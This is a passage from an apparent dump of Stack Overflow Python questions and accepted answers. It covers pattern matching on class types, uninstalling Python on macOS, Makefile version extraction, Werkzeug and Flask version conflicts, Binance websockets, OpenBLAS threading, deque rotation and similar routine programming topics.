    "AcceptedAnswer": "Try using typ() instead of typ in the match line:\n        class aaa():\n            pass\n\n        class bbb():\n            pass\n\n        def f1(typ):\n            if typ is aaa:\n                print(\"aaa\")\n            elif typ is bbb:\n                print(\"bbb\")\n            else:\n                print(\"???\")\n\n        def f2(typ):\n            match typ():\n                case aaa():\n                    print(\"aaa\")\n                case bbb():\n                    print(\"bbb\")\n                case _:\n                    print(\"???\")\n\n        f1(aaa)\n        f1(bbb)\n        f2(aaa)\n        f2(bbb)        \n\nOutput:\naaa\nbbb\naaa\nbbb\n\nUPDATE:\nBased on OP's comment asking for solution that works for classes more generally than the example classes in the question, here is an answer addressing this:\nclass aaa():\n    pass\n\nclass bbb():\n    pass\n\ndef f1(typ):\n    if typ is aaa:\n        print(\"aaa\")\n    elif typ is bbb:\n        print(\"bbb\")\n    else:\n        print(\"???\")\n\ndef f2(typ):\n    match typ.__qualname__:\n        case aaa.__qualname__:\n            print(\"aaa\")\n        case bbb.__qualname__:\n            print(\"bbb\")\n        case _:\n            print(\"???\")\n\nf1(aaa)\nf1(bbb)\nf2(aaa)\nf2(bbb)\n\nOutput:\naaa\nbbb\naaa\nbbb\n\nUPDATE #2:\nBased on this post and some perusal of PEP 364 here, I have created an example showing how a few data types (a Python builtin, a class from the collections module, and a user defined class) can be used by match to determine an action to perform based on a class type (or more generally, a data type):\nclass bbb:\n    pass\n\nclass namespacing_class:\n    class aaa:\n        pass\n\n\ndef f1(typ):\n    if typ is aaa:\n        print(\"aaa\")\n    elif typ is bbb:\n        print(\"bbb\")\n    else:\n        print(\"???\")\n\ndef f2(typ):\n    match typ.__qualname__:\n        case aaa.__qualname__:\n            print(\"aaa\")\n        case bbb.__qualname__:\n            print(\"bbb\")\n        case _:\n            print(\"???\")\n\ndef f3(typ):\n    import collections\n    match typ:\n        case namespacing_class.aaa:\n            print(\"aaa\")\n        case __builtins__.str:\n            print(\"str\")\n        case collections.Counter:\n            print(\"Counter\")\n        case _:\n            print(\"???\")\n\n'''\nf1(aaa)\nf1(bbb)\nf2(aaa)\nf2(bbb)\n'''\nf3(namespacing_class.aaa)\nf3(str)\nimport collections\nf3(collections.Counter)\n\nOutputs:\naaa\nstr\nCounter\n\nAs stated in this answer in another post:\n\nA variable name in a case clause is treated as a name capture pattern. It always matches and tries to make an assignment to the variable name. ... We need to replace the name capture pattern with a non-capturing pattern such as a value pattern that uses the . operator for attribute lookup. The dot is the key to matching this a non-capturing pattern.\n\nIn other words, if we try to say case aaa: for example, aaa will be interpreted as a name to which we assign the subject (typ in your code) and will always match and block any attempts to match subsequent case lines.\nTo get around this, for class type names (or names generally) that can be specified using a dot (perhaps because they belong to a namespace or another class), we can use the dotted name as a pattern that will not be interpreted as a name capture.\nFor built-in type str, we can use case __builtins__.str:. For the Counter class in Python's collections module, we can use case collections.Counter:. If we define class aaa within another class named namespacing_class, we can use case namespacing_class.aaa:.\nHowever, if we define class bbb at the top level within our Python code, it's not clear to me that there is any way to use a dotted name to refer to it and thereby avoid name capture.\nIt's possible there's a way to specify a user defined class type in a case line and I simply haven't figured it out yet. Otherwise, it seems rather arbitrary (and unfortunate) to be able to do this for dottable types and not for non-dottable ones.\n"
}
{
    "Id": 72005302,
    "PostTypeId": 1,
    "Title": "Completely uninstall Python 3 on Mac",
    "Body": "I installed Python 3 on Mac and installed some packages as well. But then I see AWS lamda does not support Python 3 so I decided to downgrade. I removed Python3 folder in Applications and cleared the trash. But still I see a folder named 3 in /Library/Frameworks/Python.framework/Versions which is causing problems, such as this:\n  $ python3 -m pip install virtualenv\n Requirement already satisfied: virtualenv in      /Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages (20.14.1)\n Requirement already satisfied: platformdirs=2 in /Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages (from virtualenv) (2.5.2) \n\nSo my question is how do I completely uninstall python 3 from my Mac?\n",
    "AcceptedAnswerId": 72005684,
    "AcceptedAnswer": "Removing the app does not completely uninstall that version of Python. You will need to remove the framework directories and their symbolic links.\nDeleting the frameworks\nsudo rm -rf /Library/Frameworks/Python.framework/Versions/[version number]\nreplacing [version number] with 3.10 in your case.\nRemoving symbolic links\nTo list the broken symbolic links.\nls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/[version number]'\nAnd to remove these links:\ncd /usr/local/bin\nls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/[version number]' | awk '{print $9}' | tr -d @ | xargs rm*\nAs always, please be wary of copying these commands. Please make sure the directories in the inputs are actual working directories before you execute anything.\nThe general idea in the end is to remove the folders and symlinks, and you're good to go.\nHere is another response addressing this process: How to uninstall Python 2.7 on a Mac OS X 10.6.4?\n"
}
{
    "Id": 71592060,
    "PostTypeId": 1,
    "Title": "Makefile - How should I extract the version number embedded in `pyproject.toml`?",
    "Body": "I have a python project with a pyproject.toml file. Typically I store the project's version number in pyproject.toml like this:\n% grep version pyproject.toml \nversion = \"0.0.2\"\n%\n\nI want to get that version number into a Makefile variable regardless of how many spaces wind up around the version terms.\nWhat should I do to extract the pyproject.toml version string into a Makefile environment variable called VERSION?\n",
    "AcceptedAnswerId": 71592061,
    "AcceptedAnswer": "This seemed to work out the best...  I put this in my Makefile\n# grep the version from pyproject.toml, squeeze multiple spaces, delete double\n#   and single quotes, get 3rd val. This command tolerates \n#   multiple whitespace sequences around the version number\nVERSION := $(shell grep -m 1 version pyproject.toml | tr -s ' ' | tr -d '\"' | tr -d \"'\" | cut -d' ' -f3)\n\nSpecial thanks to @charl-botha for the -m 1 grep argument... both gnu and bsd grep support -m in this context.\n"
}
{
    "Id": 71661851,
    "PostTypeId": 1,
    "Title": "TypeError: __init__() got an unexpected keyword argument 'as_tuple'",
    "Body": "While I am testing my API I recently started to get the error below.\n        if request is None:\n>           builder = EnvironBuilder(*args, **kwargs)\nE           TypeError: __init__() got an unexpected keyword argument 'as_tuple'\n\n/usr/local/lib/python3.7/site-packages/werkzeug/test.py:1081: TypeError\n\nAs I read from the documentation in the newer version of Werkzeug the as_tuple parameter is removed.\nPart of my test code is\n\nfrom flask.testing import FlaskClient\n\n@pytest.fixture(name='test_client')\ndef _test_client() -> FlaskClient:\n    app = create_app()\n    return app.test_client()\n\n\nclass TestPeerscoutAPI:\n    def test_should_have_access_for_status_page(self, test_client: FlaskClient):\n        response = test_client.get('/api/status')\n        assert _get_ok_json(response) == {\"status\": \"OK\"}\n\nAny help would be greatly appreciated.\n",
    "AcceptedAnswerId": 71662972,
    "AcceptedAnswer": "As of version 2.1.0, werkzeug has removed the as_tuple argument to Client. Since Flask wraps werkzeug and you're using a version that still passes this argument, it will fail. See the exact change on the GitHub PR here.\nYou can take one of two paths to solve this:\n\nUpgrade flask\n\nPin your werkzeug version\n\n\n# in requirements.txt\nwerkzeug==2.0.3\n\n"
}
{
    "Id": 71356388,
    "PostTypeId": 1,
    "Title": "How to connect to User Data Stream Binance?",
    "Body": "I need to listen to User Data Stream, whenever there's an Order Event - order execution, cancelation, and so on - I'd like to be able to listen to those events and create notifications.\nSo I got my \"listenKey\" and I'm not sure if it was done the right way but I executed this code and it gave me something like listenKey.\nCode to get listenKey:\ndef get_listen_key_by_REST(binance_api_key):\n    url = 'https://api.binance.com/api/v1/userDataStream'\n    response = requests.post(url, headers={'X-MBX-APIKEY': binance_api_key}) \n    json = response.json()\n    return json['listenKey']\n\nprint(get_listen_key_by_REST(API_KEY))\n\nAnd the code to listen to User Data Stream - which doesn't work, I get no json response.\nsocket = f\"wss://fstream-auth.binance.com/ws/btcusdt@markPrice?listenKey=\"\n\ndef on_message(ws, message):\n    json_message = json.loads(message)\n    print(json_message)\n\ndef on_close(ws):\n    print(f\"Connection Closed\")\n    # restart()\n\ndef on_error(ws, error):\n    print(f\"Error\")\n    print(error)\n\nws = websocket.WebSocketApp(socket, on_message=on_message, on_close=on_close, on_error=on_error)\n\nI have read the docs to no avail. I'd appreciate it if someone could point me in the right direction.\n",
    "AcceptedAnswerId": 71445546,
    "AcceptedAnswer": "You can create a basic async user socket connection from the docs here along with other useful info for the Binance API. Here is a simple example:\nimport asyncio\nfrom binance import AsyncClient, BinanceSocketManager\n\nasync def main():\n    client = await AsyncClient.create(api_key, api_secret, tld='us')\n    bm = BinanceSocketManager(client)\n    # start any sockets here, i.e a trade socket\n    ts = bm.user_socket()\n    # then start receiving messages\n    async with ts as tscm:\n        while True:\n            res = await tscm.recv()\n            print(res)\n    await client.close_connection()\n\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n\n"
}
{
    "Id": 71703734,
    "PostTypeId": 1,
    "Title": "How to upgrade version of pyenv on Ubuntu",
    "Body": "I wanted to install python 3.10 but that version is not available on pyenv version list.\nchecked by pyenv install --list.\nPeople suggested to upgrade pyenv that but I do not see help related to updating pyenv.\n",
    "AcceptedAnswerId": 71703884,
    "AcceptedAnswer": "pyenv isn't really 'installed' in a traditional sense, it's just a git checkout. All you have to do to update is\ncd ~/.pyenv\ngit pull\n\nThat also updates the list of available python versions.\n"
}
{
    "Id": 71701629,
    "PostTypeId": 1,
    "Title": "ImportError: No module named _thread",
    "Body": "Compiling python2 in vscode gives an error.\nBut when I compile python3 it succeeds.\nprint('test')\n\nreturns: ImportError: No module named _thread\nPS C:\\source>  c:; cd 'c:\\source'; & 'C:\\Python27\\python.exe' 'c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\launcher' '52037' '--' 'c:\\source\\test.py' \nTraceback (most recent call last):\n  File \"C:\\Python27\\lib\\runpy.py\", line 174, in _run_module_as_main\n    \"__main__\", fname, loader, pkg_name)\n  File \"C:\\Python27\\lib\\runpy.py\", line 72, in _run_code\n    exec code in run_globals\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\__main__.py\", line 43, in \n    from debugpy.server import cli\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy/../debugpy\\server\\__init__.py\", line 9, in \n    import debugpy._vendored.force_pydevd  # noqa\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy/../debugpy\\_vendored\\force_pydevd.py\", line 37, in \n    pydevd_constants = import_module('_pydevd_bundle.pydevd_constants')\n  File \"C:\\Python27\\lib\\importlib\\__init__.py\", line 37, in import_module\n    __import__(name)\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\_vendored\\pydevd\\_pydevd_bundle\\pydevd_constants.py\", line 362, in   \n    from _pydev_bundle._pydev_saved_modules import thread, threading\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\_vendored\\pydevd\\_pydev_bundle\\_pydev_saved_modules.py\", line 94, in \n    import _thread as thread;    verify_shadowed.check(thread, ['start_new_thread', 'start_new', 'allocate_lock'])\nImportError: No module named _thread\n\n",
    "AcceptedAnswerId": 71704278,
    "AcceptedAnswer": "There is an issue with the vscode python extension version 2022.4.0\njust downgrade to version 2022.2.1924087327 and it will work as it works for me now\nJust follow these steps:\n\nGo to extensions.\nClick on Gear Icon for the installed extension\nClick on Install Another Version\nselect the version you wish to install\n\n\n"
}
{
    "Id": 72238460,
    "PostTypeId": 1,
    "Title": "Python ImportError: sys.meta_path is None, Python is likely shutting down",
    "Body": "When using __del__\ndatetime.date.today() throws ImportError: sys.meta_path is None, Python is likely shutting down\nimport datetime\nimport time\nimport sys\n\n\nclass Bug(object):\n\n    def __init__(self):\n        print_meta_path()\n\n    def __del__(self):\n        print_meta_path()\n        try_date('time')\n        try_date('datetime')\n\n\ndef print_meta_path():\n    print(f'meta_path: {sys.meta_path}')\n\n\ndef try_date(date_type):\n    try:\n        print('----------------------------------------------')\n        print(date_type)\n        if date_type == 'time':\n            print(datetime.date.fromtimestamp(time.time()))\n        if date_type == 'datetime':\n            print(datetime.date.today())\n    except Exception as ex:\n        print(ex)\n\n\nif __name__ == '__main__':\n    print(sys.version)\n    bug = Bug()\n\noutput with different envs (3.10, 3.9, 3.7):\n3.10.4 | packaged by conda-forge | (main, Mar 24 2022, 17:39:04) [GCC 10.3.0]\nmeta_path: [, , , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\n3.9.12 | packaged by conda-forge | (main, Mar 24 2022, 23:22:55)\n[GCC 10.3.0]\nmeta_path: [, , , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\n3.7.12 | packaged by conda-forge | (default, Oct 26 2021, 06:08:53)\n[GCC 9.4.0]\nmeta_path: [, , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\n3.8.10 (default, Mar 15 2022, 12:22:08) \n[GCC 9.4.0]\nmeta_path: [, , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\nWhy is that happening?\nI need to use requests which use urllib3 connection.py\n380:  is_time_off = datetime.date.today() \n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/api.py\", line 117, in post\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/api.py\", line 61, in request\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/sessions.py\", line 529, in request\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/sessions.py\", line 645, in send\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/adapters.py\", line 440, in send\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py\", line 703, in urlopen\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py\", line 386, in _make_request\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py\", line 1040, in _validate_conn\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connection.py\", line 380, in connect\nImportError: sys.meta_path is None, Python is likely shutting down\n\nswitching the line to\n380:  is_time_off = datetime.date.fromtimestamp(time.time())  solve it.\nOS Linux-5.13.0-41-generic-x86_64-with-glibc2.31\nurllib3 1.26.9\n\nI already tried to rebind __del__ arguments default\ndef __del__(self, datetime=datetime):....\nDoes anyone have an idea? thanks\n",
    "AcceptedAnswerId": 72275619,
    "AcceptedAnswer": "Using atexit provide the same behavior as __del__ but works\nimport datetime\nimport time\nimport sys\nimport atexit\n\n\nclass Bug(object):\n\n    def __init__(self):\n        print_meta_path()\n        atexit.register(self.__close)\n\n    def __close(self):\n        print_meta_path()\n        try_date('time')\n        try_date('datetime')\n\n\ndef print_meta_path():\n    print(f'meta_path: {sys.meta_path}')\n\n\ndef try_date(date_type):\n    try:\n        print('----------------------------------------------')\n        print(date_type)\n        if date_type == 'time':\n            print(datetime.date.fromtimestamp(time.time()))\n        if date_type == 'datetime':\n            print(datetime.date.today())\n    except ImportError:\n        print('')\n\n\nif __name__ == '__main__':\n    print(sys.version)\n    bug = Bug()\n\noutput:\n3.10.4 | packaged by conda-forge | (main, Mar 24 2022, 17:38:57) [GCC 10.3.0]\nmeta_path: [, , , ]\nmeta_path: [, , , ]\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\n2022-05-17\n\nProcess finished with exit code 0\n\n"
}
{
    "Id": 72280762,
    "PostTypeId": 1,
    "Title": "pip broke after downlading python-certifi-win32",
    "Body": "I have downloaded python for the first time in a new computer(ver 3.10.4).\nI have download the package python-certifi-win32, after someone suggested it as a solution to a SSL certificate problem in a similar question to a problem I had.\nSince then, pip has completely stopped working, to the point where i can't not run pip --version\nEvery time the same error is printed, it is mostly seemingly junk(just a deep stack trace), but the file at the end is different.\nstart of the printed log:\nTraceback (most recent call last):\n  File \"C:\\Users\\---\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_common.py\", line 89, in _tempfile\n    os.write(fd, reader())\n  File \"C:\\Users\\---\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\abc.py\", line 371, in read_bytes\n    with self.open('rb') as strm:\n  File \"C:\\Users\\---\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_adapters.py\", line 54, in open\n    raise ValueError()\nValueError\n\nDuring handling of the above exception, another exception occurred:\n\nlast row of the printed log:\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\\\Users\\\\-----\\\\AppData\\\\Local\\\\Temp\\\\tmpunox3fhw'\n\n",
    "AcceptedAnswerId": 72293534,
    "AcceptedAnswer": "I found the answer in another question -\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: after installing python-certifi-win32\nbasically, you should remove two files that initialize python-certifi-win32 when running pip. the files are located in the directory:\nC:\\Users\\\\AppData\\Local\\Programs\\Python\\Python310\\Lib\\site-packages\n\nand their names are:\npython-certifi-win32-init.pth\ndistutils-precedence.pth\n\nShoutout to Richard from the mentioned post :)\n"
}
{
    "Id": 71737743,
    "PostTypeId": 1,
    "Title": "How can I change playback speed of an audio file in python whilst it is playing?",
    "Body": "I've done alot of searching to try and find a way to achieve this but the solutions I've found either don't do what I need or I don't understand them.\nI'm looking for a way of playing a sound in python (non-blocking) that allows me to change the playback speed in real time, as it's playing, with no gaps or cutouts.\nChanging the pitch is fine. Audio quality isn't even that important.\nMost of the solutions I've found only allow setting the playback speed once, before the file is played.\n",
    "AcceptedAnswerId": 71748928,
    "AcceptedAnswer": "I've found a solution, using python-mpv, a wrapper for mpv.io\nfrom pynput.keyboard import Key, Listener\nimport mpv\nspeed=1\n\n#quick function to change speed via keyboard. \ndef on_press(key):\n\n    global speed\n\n    if key.char == 'f' :\n        speed=speed-0.1\n        player.speed=speed\n    if key.char == 'g' :\n        speed=speed+0.1\n        player.speed=speed\n\nplayer = mpv.MPV(ytdl=True)\nplayer.play('/Users/regvardy/mediapipe_faceswap-main/test.wav')\nwith Listener(\n        on_press=on_press) as listener:\n    listener.join()\nwhile True:\n    \n    player.speed=speed\n\nI haven't tested it for stability yet.\nIt feels like a workaround rather than me actually finding out how to do it so I may try and find a different solution.\n"
}
{
    "Id": 72277275,
    "PostTypeId": 1,
    "Title": "How to monitor per-process network usage in Python?",
    "Body": "I'm looking to troubleshoot my internet issue so I need a way to track both my latency and which application is using how much network bandwidth.\nI've already sorted out checking latency, but now I need a way to monitor each process' network usage (KB/s), like how it appears in Windows Task Manager.\nBefore you suggest a program, unless it's able to record the values with a timestamp then that's not what I'm looking for. I'm asking for a Pythonic way because I need to record the network bandwidth and latency values at the same time so I can figure out if a specific process is causing latency spikes.\nSo here's the info I need:\nTime | Process ID | Process Name | Down Usage | Up Usage | Network Latency |\nAlso, please don't link to another Stackoverflow question unless you know their solution works. I've looked through plenty already and none of them work, which is why I'm asking again.\n",
    "AcceptedAnswerId": 72310057,
    "AcceptedAnswer": "Following the third section of this guide provided me with all of the information listed in the post, minus latency. Given that you said you already had measuring latency figured out, I assume this isn't an issue.\nLogging this to csv/json/whatever is pretty easy, as all of the information is stored in panda data frames.\nAs this shows the time the process was created, you can use datetime to generate a new timestamp at the time of logging.\nI tested this by logging to a csv after the printing_df variable was initialized, and had no issues.\n"
}
{
    "Id": 72520366,
    "PostTypeId": 1,
    "Title": "Why does `functools.partial` not inherit `__name__` and other meta data by default?",
    "Body": "I am wondering why meta data (e.g. __name__, __doc__) for the wrapped method/function by partial is not inherited by default. Instead, functools provides the update_wrapper function.\nWhy it is not done by default is not mentioned anywhere (as far as I could see) e.g. here and many tutorials on functools.partial talk about how to \"solve the issue\" of a missing __name__.\nAre there examples where inheriting this information causes problems/confusion?\n",
    "AcceptedAnswerId": 72520451,
    "AcceptedAnswer": "Think about what that would actually look like:\ndef add(x, y):\n    \"Adds two numbers\"\n    return x + y\n\nadd_5 = partial(add, 5)\n\nWould it actually make sense for add_5 to have __name__ set to \"add\" and __doc__ set to \"Adds two numbers\"?\nThe callable created by partial behaves completely differently from the original function. It wouldn't be appropriate for the new callable to inherit the name and docstring of a function with completely different behavior.\n"
}
{
    "Id": 72018887,
    "PostTypeId": 1,
    "Title": "How to build a universal wheel with pyproject.toml",
    "Body": "This is the project directory structure\n.\n\u251c\u2500\u2500 meow.py\n\u2514\u2500\u2500 pyproject.toml\n\n0 directories, 2 files\n\nThis is the meow.py:\ndef main():\n    print(\"meow world\")\n\nThis is the pyproject.toml:\n[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"meowpkg\"\nversion = \"0.1\"\ndescription = \"a package that meows\"\n\n[project.scripts]\nmeow_world = \"meow:main\"\n\nWhen building this package, no matter whether with python3 -m pip wheel . or using python3 -m build, it creates a file named like meowpkg-0.1-py3-none-any.whl which can not be installed on Python 2.\n$ python2.7 -m pip install meowpkg-0.1-py3-none-any.whl\nERROR: meowpkg-0.1-py3-none-any.whl is not a supported wheel on this platform.\n\nBut \"meowpkg\" actually works on Python 2 as well. How to instruct setuptools and/or wheel to create a universal wheel tagged like meowpkg-0.1-py2.py3-none-any.whl, without using the old setup.cfg/setup.py ways?\nCurrent workaround:\necho \"[bdist_wheel]\\nuniversal=1\" > setup.cfg && python3 -m build && rm setup.cfg\n\n",
    "AcceptedAnswerId": 72524833,
    "AcceptedAnswer": "Add this section into the pyproject.toml:\n[tool.distutils.bdist_wheel]\nuniversal = true\n\n"
}
{
    "Id": 72663092,
    "PostTypeId": 1,
    "Title": "Getting numpy.linalg.svd and numpy matrix multiplication to use multithreadng",
    "Body": "I have a script that uses a lot of numpy and numpy.linalg functions and after some reaserch it tourned out that supposedly they automaticaly use multithreading. Altought that, my htop display always shows just one thread being used to run my script.\nI am new to multithreading and I don\u00b4t quite now how to set up it correctly.\nI am mostly making use of numpy.linalg.svd\nHere is the output of numpy.show_config()\nopenblas64__info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nblas_ilp64_opt_info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nopenblas64__lapack_info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None), ('HAVE_LAPACKE', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nlapack_ilp64_opt_info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None), ('HAVE_LAPACKE', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nSupported SIMD extensions in this NumPy install:\n    baseline = SSE,SSE2,SSE3\n    found = SSSE3,SSE41,POPCNT,SSE42,AVX,F16C,FMA3,AVX2\n    not found = AVX512F,AVX512CD,AVX512_KNL,AVX512_KNM,AVX512_SKX,AVX512_CLX,AVX512_CNL,AVX512_ICL\n\nMRE\nimport numpy as np \nimport tensorly as ty \n\n\ntensor = np.random.rand(32,32,32,32)\n\nunfolding = ty.unfold(tensor,0)\nunfolding = unfolding @ unfolding.transpose()\nU,S,_ = np.linalg.svd(unfolding)\n\n\nUpdate\nAs suggested in the accepted answer, rebuilding numpy with MKL solved the issue.\n",
    "AcceptedAnswerId": 72669414,
    "AcceptedAnswer": "The main issue is that the size of the matrices is too small for threads to be really worth it on all platforms. Indeed, OpenBLAS uses OpenMP to create threads regarding the size of the matrix. Threads are generally created once but the creation can take from dozens of microseconds to dozens of milliseconds regarding the machine (typically hundreds of microseconds on a regular PC). The bigger the number of cores on the machine the bigger the number of threads to create and so the bigger the overhead. When the OpenMP thread pool is reused, there are still overheads to pay mainly due to the distribution of the work and synchronizations between threads though the overheads are generally significantly smaller (typically an order of magnitude smaller).\nThat being said, OpenBLAS makes clearly sub-optimal choices when the output matrix is tiny compared to the input ones (which is your case). Indeed, OpenBLAS can hardly know the parallel overhead before running the target kernel so it has to make a choice: set a threshold typically based on the size of the input matrix so to define when the kernel will be executed sequentially or with multiple threads. This is critical for very small kernel to still be fast as well as huge ones to remain competitive with other BLAS implementations. The thing is this threshold is not perfectly chosen. It looks like OpenBLAS only look the size of the output matrix which is clearly sub-optimal for \"thin\" matrices like in your code (eg. 50x1000000 @ 1000000x50). An empirical analysis show that the threshold is arbitrary set to 100x100 in your case: beyond this threshold, OpenBLAS use multiple threads but not otherwise. The thing is threads are already useful for significantly smaller matrices in your case on most platforms (eg. for 64x64x64x64 tensors).\nThis threshold is tuned by compile-time definitions like GEMM_MULTITHREAD_THRESHOLD which is used in gemm.c (or gemv.c. Note that in the code, the k dimension matters but this is not what benchmarks show on my machine (possibly due to an older version of OpenBLAS being used). You can rebuild OpenBLAS with a smaller threshold (like 1 instead of 4).\nAn alternative solution is to use another BLAS implementation like BLIS or the Intel MKL that should use different threshold (possibly better ones). A last solution is to implement a specific implementation to efficiently compute the matrices of your code (possibly using Numba or Cython) but BLAS implementations are heavily optimized so it is often hard to actually write a faster code (unless you are very familiar with low-level optimizations, compilers, and modern processor architectures).\n\n"
}
{
    "Id": 72677648,
    "PostTypeId": 1,
    "Title": "How to iterate through list infinitely with +1 offset each loop",
    "Body": "I want to infinitely iterate through the list from 0 to the end, but in the next loop I want to start at 1 to the end plus 0, and the next loop would start at 2 to the end plus 0, 1, up to the last item where it would start again at 0 and go to the end.\nHere is my code:\na = [ 0, 1, 2 ]\noffset = 0\nrotate = 0\n\nwhile True:\n    print(a[rotate])\n    offset += 1\n    rotate += 1\n    if offset >= len(a):\n        offset = 0\n        rotate += 1\n    if rotate >= len(a):\n        rotate = 0\n\nThis is the solution I came up with so far. It's far from perfect.\nThe result that I want is:\n0, 1, 2 # first iteration\n1, 2, 0 # second iteration\n2, 0, 1 # third iteration\n0, 1, 2 # fourth iteration\n\nand so on.\n",
    "AcceptedAnswerId": 72683695,
    "AcceptedAnswer": "You can use a deque which has a built-in and efficient rotate function (~O(1)):\n>>> d = deque([0,1,2])\n>>> for _ in range(10):\n...     print(*d)\n...     d.rotate(-1)  # negative -> rotate to the left\n...\n0 1 2\n1 2 0\n2 0 1\n0 1 2\n1 2 0\n2 0 1\n0 1 2\n1 2 0\n2 0 1\n0 1 2\n\n"
}
{
    "Id": 72175135,
    "PostTypeId": 1,
    "Title": "mypy - How to mark line as unreachable",
    "Body": "I've got a function of the form:\ndef get_new_file(prefix: str) -> pathlib.Path:\n    for i in itertools.count(0):\n        p = pathlib.Path(f'{prefix}_{i}')\n        if not p.is_file():\n            return p\n    # This line is unreachable.\n\nmypy understandably complains that the function is missing a return statement.  Is there a way to mark a line so as to inform mypy that the line should be considered unreachable?\n",
    "AcceptedAnswerId": 72175249,
    "AcceptedAnswer": "This was raised as an issue. The recommended solution is assert False.\ndef get_new_file(prefix: str) -> pathlib.Path:\n    for i in itertools.count(0):\n        p = pathlib.Path(f'{prefix}_{i}')\n        if not p.is_file():\n            return p\n    assert False\n\n"
}
{
    "Id": 71102876,
    "PostTypeId": 1,
    "Title": "in ipython how do I accept and use an autocomplete suggestion?",
    "Body": "I'm using Python 3.8.9 with IPython 8.0.1 on macOS. When I type anything whatsoever, it displays a predicted suggestion based on past commands. Cool.\nHowever, how do I actually accept that suggestion? I tried the obvious: tab, which does not accept the suggestion, but rather opens up a menu with different suggestions, while the original suggestion is still there (see screenshot).\nI also tried space, and return, but both of those act as if the suggestion was never made. How the heck do I actually use the ipython autosuggestion? Or is tab supposed to work and something is wrong with my ipython build or something?\n\n",
    "AcceptedAnswerId": 71459528,
    "AcceptedAnswer": "CTRL-E, CTRL-F, or Right Arrow Key\nhttps://ipython.readthedocs.io/en/6.x/config/shortcuts/index.html\n"
}
{
    "Id": 71689095,
    "PostTypeId": 1,
    "Title": "How to solve the pytorch RuntimeError: Numpy is not available without upgrading numpy to the latest version because of other dependencies",
    "Body": "I am running a simple CNN using Pytorch for some audio classification on my Raspberry Pi 4 on Python 3.9.2 (64-bit). For the audio manipulation needed I am using librosa. librosa depends on the numba package which is only compatible with numpy version \nWhen running my code, the line\nspect_tensor = torch.from_numpy(spect).double()\n\nthrows the RuntimeError:\nRuntimeError: Numpy is not available\n\nSearching the internet for solutions I found upgrading Numpy to the latest version to resolve that specific error, but throwing another error, because Numba only works with Numpy \nIs there a solution to this problem which does not include searching for an alternative to using librosa?\n",
    "AcceptedAnswerId": 71750812,
    "AcceptedAnswer": "Just wanted to give an update on my situation. I downgraded torch to version 0.9.1 which solved the original issue. Now OpenBLAS is throwing a warning because of an open MPLoop. But for now my code is up and running.\n"
}
{
    "Id": 71520075,
    "PostTypeId": 1,
    "Title": "zip_longest for the left list always",
